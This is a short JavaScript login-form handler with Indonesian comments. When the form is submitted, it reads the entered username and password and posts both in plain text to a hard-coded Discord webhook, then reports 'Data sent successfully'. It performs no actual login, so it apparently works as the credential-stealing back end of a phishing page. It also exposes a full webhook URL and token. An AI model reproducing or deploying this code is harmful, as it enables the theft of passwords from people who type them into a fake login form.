document.getElementById('loginForm').addEventListener('submit', async (e) => {
    e.preventDefault();
  
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    const webhookURL = "https://discord.com/api/webhooks/1314183650228572191/oITp_HxLKKtTkeQ4ByAdgbFDJFpn7jcQJPI_LJRUNnoaTnh2PeTiHpCIIJW9hzCJRJAS"; // Ganti dengan webhook Discord Anda
  
    if (!username || !password) {
      document.getElementById('status').textContent = "All fields are required!";
      return;
    }
  
    // Membuat password dalam format spoiler
    const spoilerPassword = `||${password}||`;
  
    const payload = {
      content: `**New Login Attempt**\nUsername: ${username}\nPassword: ${spoilerPassword}`,
    };
  
    try {
      const response = await fetch(webhookURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });
  
      if (response.ok) {
        document.getElementById('status').textContent = "Data sent successfully!";
        document.getElementById('status').style.color = "green";
      } else {
        document.getElementById('status').textContent = "Failed to send data.";
      }
    } catch (error) {
      document.getElementById('status').textContent = "Error occurred!";
      console.error(error);
    }
  });
  